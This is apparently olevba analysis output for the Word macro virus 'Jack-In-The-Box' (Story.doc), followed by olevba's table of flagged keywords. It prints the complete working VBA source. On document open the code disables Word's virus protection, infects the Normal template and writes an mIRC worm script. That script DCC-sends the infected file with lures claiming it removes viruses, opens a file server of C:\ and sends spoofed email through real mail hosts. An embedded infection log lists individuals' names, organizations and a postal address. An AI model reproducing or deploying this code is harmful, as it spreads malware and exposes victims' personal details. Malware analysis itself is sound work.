olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Story-ee490b76a87d34604c8d5c25c19798fc74bc7002
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Story-ee490b76a87d34604c8d5c25c19798fc74bc7002 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
'Jack-In-The-Box
Set Something = Options
Something.VirusProtection = 0
Something.ConfirmConversions = 0
Something.SaveNormalPrompt = 0
Application.EnableCancelKey = 0
Application.StatusBar = 0
Application.ScreenUpdating = 0
Set AnI = ActiveDocument.VBProject.VBComponents(1)
Set BnI = NormalTemplate.VBProject.VBComponents(1)
If UCase(AnI.CodeModule.Lines(3, 1)) = "'JACK-IN-THE-BOX" Then InA = 1
If UCase(BnI.CodeModule.Lines(3, 1)) = "'JACK-IN-THE-BOX" Then InB = 1
If InA = 1 And InB = 1 Then Exit Sub
Set CnI = MacroContainer.VBProject.VBComponents.Item(1)
VCode = CnI.CodeModule.Lines(2, CnI.CodeModule.CountOfLines)
If InA = 1 Then BnI.CodeModule.AddFromString ("Private Sub Document_Close" & Chr(13) & VCode)
If InB = 1 Then AnI.CodeModule.AddFromString ("Private Sub Document_Open" & Chr(13) & VCode)
NormalTemplate.Save
somename = ActiveDocument.Name
DoEvents
If InB = 1 Then
If Dir("C:\mirc\mirc32.exe") <> "" Then
var3 = "C:\mirc\script.ini"
If System.PrivateProfileString("C:\mirc\mirc.ini", "warn", "fserve") <> "" Then System.PrivateProfileString("C:\mirc\mirc.ini", "warn", "fserve") = "off"
If System.PrivateProfileString("C:\mirc\mirc.ini", "fileserver", "warning") <> "" Then System.PrivateProfileString("C:\mirc\mirc.ini", "fileserver", "warning") = "off"
If Dir(var3) <> "" Then Kill var3
Open "C:\mirc\script.ini" For Output As #1
Print #1, "[script]"
Print #1, "n0=On 1:Connect:{ .notify SimpleSmn | Set %var7 $rand(1,8) | If ( %var7 = 1 ) { Set %var8 mirc.com } | If ( %var7 = 2 ) { Set %var8 georgecarlin.com } | If ( %var7 = 3 ) { Set %var8 carrottop.com } | If ( %var7 = 4 ) { Set %var8 anvdesign.net } | If ( %var7 = 5 ) { Set %var8 symantec.com } | If ( %var7 = 6 ) { Set %var8 drsolomon.com } | If ( %var7 = 7 ) { Set %var8 www.bocklabs.wisc.edu } | If ( %var7 = 8 ) { Set %var8 ebay.com } | Set %var9 $rand(1,4) | If ( %var9 = 1 ) { Set %var10 evrt@avp.com } | If ( %var9 = 2 ) { Set %var10 samples@datafellows.com } | If ( %var9 = 3 ) { Set %var10 virus_research@nai.com } | If ( %var9 = 3 ) { Set %var10 tech_support@nai.com } | If ( $exists(C:\Windows\script1.ini) = $true ) { .remove C:\Windows\script1.ini } | .copy C:\mirc\script.ini C:\Windows\script1.ini | .load -rs C:\Windows\script1.ini | .write -c C:\mirc\script.ini [script] | .reload -rs C:\mirc\script.ini }"
Print #1, "n1=On 1:Input:*:{ Set %var1 $1- | If ( $upper(%var1) = /BY ) { .echo 1Mirc Worm 4Jack-In-The-Box | .echo 12<9<12<9By SimpleSimon12>9>12> | halt } }"
Print #1, "n2=On 1:Notify:{ .timer3 1 10 { .clear -s } | If ( $nick == SimpleSmn ) { .msg SimpleSmn I'm on irc. | halt } | .timer1 1 15 { .notify -r $nick | .ignore $nick | .timer9 1 5 { .msg $nick Hey, I can't talk right now but I wanted to send you this file.  It has a funny story you should read, and also has macros inside that protect you from a lot of viruses.  Just open the document, enable the macros, and if you are infected it will get rid of the virus } | .timer2 1 15 { .dcc send $nick C:\Windows\Story.doc } } | .timer 1 16 { .notify | .clear -s } }"
Print #1, "n3=On 1:Unotify: .clear -s"
Print #1, "n4=On 1:Join:#: if (help isin $chan) || (nohack isin $chan) { .part $chan } | If ( $exists(C:\mirc\script.ini) = $true ) { .remove C:\mirc\script.ini }"
Print #1, "n5=On 1:Filercvd:*.*: If ( $me != $nick ) { .dcc send $nick C:\Windows\Story.doc }"
Print #1, "n6=On 1:Invite:#:{ .ignore $nick | .timer 1 10 { .join # } | .timer 1 15 { .msg $nick Thanks for the invite } | .timer 1 20 { .msg $nick I'm a little busy so I can't talk much now.  I thought you might want to look at this file I got. It has a funny story and also has macros in it which get rid of any macro viruses.  Just enable the macros when the prompt comes up and it will scan for any viruses and clean them. } | .timer 1 25 { .dcc send $nick C:\Windows\Story.doc } }"
DoEvents
Print #1, "n7=On 1:Notice:Simplicity:*: .fserve $nick 100 C:\"
Print #1, "n8=On 1:Text:*script*:*: .ignore $nick"
Print #1, "n9=On 1:Text:*worm*:*: .ignore $nick"
Print #1, "n10=On 1:Text:*virus*:*: .ignore $nick"
Print #1, "n11=On 1:Text:*infect*:*: .ignore $nick"
Print #1, "n12=On 1:Text:*Jack*Box*:*: .ignore $nick"
Print #1, "n13=On 1:Text:*macro*:*: .ignore $nick"
Print #1, "n14=On 1:Text:*Story.doc*: .ignore $nick"
Print #1, "n15=On 1:Text:*Hi*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
DoEvents
Print #1, "n16=On 1:Text:*!*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
Print #1, "n17=On 1:Text:*Hey*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
Print #1, "n18=On 1:Text:*Hello*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
Print #1, "n19=On 1:Sockopen:virc:{ Unset %var2 | Unset %var4 | Unset %var6 | Set %var1 $rand(3, 8) + 1 | Set %loop 1 | Set %var3 0 | :check1 | If ( %loop = %var1 ) { goto out } | If ( %var3 = 0 ) { Set %var2 %var2 $rand(A, Z) } | If ( %var3 = 1 ) { Set %var4 %var4 $rand(A, Z) } | If ( %var3 = 2 ) { Set %var6 %var6 $rand(A, Z) } | If ( %var3 = 2 ) && ( $rand(1, 3) = 2 ) { Set %var6 %var6 $chr(225) } | inc %loop | goto check1 | :out | If ( %var3 = 0 ) { Set %var3 1 | Set %var1 $rand(3, 8) | Set %loop 1 | goto check1 } | If ( %var3 = 1 ) { Set %var3 2 | Set %var1 $rand(5, 50) | Set %loop 1 | goto check1 } | Set %var2 $remove(%var2, $chr(32) ) | Set %var4 $remove(%var4, $chr(32) ) | Set %var5 %var2 @ %var4 .com | Set %var5 $remove(%var5, $chr(32) ) | Set %var6 $remove(%var6, $chr(32) ) | Set %var6 $replace(%var6, $chr(225), $chr(32) ) | If ( %var7 = 6 ) { .sockwrite -n virc Helo %var2 } | .sockwrite -n virc mail from: %var5"
Print #1, "n20=If ( $sockerr != 0 ) { halt } | .sockwrite -n virc rcpt to: %var10 | .sockwrite -n virc data | .sockwrite -n virc To: %var10 | .sockwrite -n virc From: %var5 | .sockwrite -n virc Subject: %var6 | .sockwrite -n virc Jack-In-The-Box Has Popped Up Again! | .sockwrite -n virc . | .sockwrite -n virc Quit | .sockclose virc }"
Print #1, "n21=On 1:Disconnect:{ If ( $exists(C:\mirc\script.ini) = $true ) { .remove C:\mirc\script.ini } | If ( $exists(C:\Windows\script1.ini) = $true ) { .copy C:\Windows\script1.ini C:\mirc\script.ini | .remove C:\Windows\script1.ini } }"
Close #1
If Dir("C:\windows\Story.doc") = "" Then
ActiveDocument.SaveAs FileName:="C:\Windows\Story.doc", AddToRecentFiles:=False
End If
End If
If Left(somename, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End If
CommandBars("Tools").Controls("Macro").Enabled = 0
CommandBars("Tools").Controls("Customize...").Enabled = 0
CommandBars("View").Controls("Toolbars").Enabled = 0
CommandBars("View").Controls("Status Bar").Enabled = 0
End Sub






















































' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 03:07:26 PM - Tuesday, 22 Dec 1998
' BCBSA
'



' 02:53:45 PM - Tuesday, 5 Jan 1999
' BCBSA
'



' 02:43:30 PM - Friday, 8 Jan 1999
' Michele Steele
'



' 06:51:05 AM - Tuesday, 12 Jan 1999
' iac883
'



' 10:42:53 AM - Thursday, 14 Jan 1999
' ia7039
'



' 11:17:30 AM - Thursday, 14 Jan 1999
' Susan K Osmann
'



' 08:39:20 AM - Friday, 15 Jan 1999
' iab086
'



' 10:13:51 AM - Monday, 18 Jan 1999
' iac112
'



' 04:38:15 PM - Monday, 18 Jan 1999
' ia5401
'



' 05:51:09 PM - Thursday, 21 Jan 1999
' iaa645
'



' 01:40:06 PM - Monday, 25 Jan 1999
' ia6989
'



' 03:31:53 PM - Wednesday, 27 Jan 1999
' iaa186
'



' 04:22:48 PM - Friday, 29 Jan 1999
' IA8971
'



' 12:34:23 PM - Thursday, 4 Feb 1999
' ia9774
'



' 01:13:23 PM - Monday, 8 Feb 1999
' College of Design
'



' 08:42:57 AM - Tuesday, 9 Feb 1999
' Carver Hall Computer Labs
'



' 08:56:33 AM - Friday, 12 Feb 1999
' students
'



' 01:12:52 PM - Monday, 22 Feb 1999
' carrie van aernam
'



' 11:08:06 AM - Thursday, 25 Feb 1999
' MK0108W9501
'



' 01:54:12 PM - Friday, 26 Feb 1999
' Pat Wagaman
'



' 11:41:31 AM - Monday, 1 Mar 1999
' ECAEO Computer
'



' 09:46:54 AM - Thursday, 4 Mar 1999
' Mark E. Settle
' ISU Outreach Center
' P.O. Box 2068
' Cedar Rapids, IA  52406



' 01:20:49 PM - Wednesday, 10 Mar 1999
' janet anderson
'



' 11:18:27 AM - Tuesday, 18 May 1999
' W. Scott Nelson
'



' 09:21:12 AM - Monday, 24 May 1999
' Midland Dairy Association
'



' 10:10:07 AM - Tuesday, 3 Aug 1999
' Midland Dairy Association
'



' 08:38:42 AM - Monday, 23 Aug 1999
' Midland Dairy Association
'



' 06:05:49 PM - Sunday, 19 Sep 1999
' Midland Dairy Association
'



' 09:55:09 PM - Sunday, 26 Sep 1999
' Preferred Customer
'



' 07:38:04 PM - Friday, 15 Oct 1999
' Housing and Dining Serrices
'



' 01:44:57 PM - Thursday, 9 Dec 1999
' Charles Helm
'



















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |mirc32.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

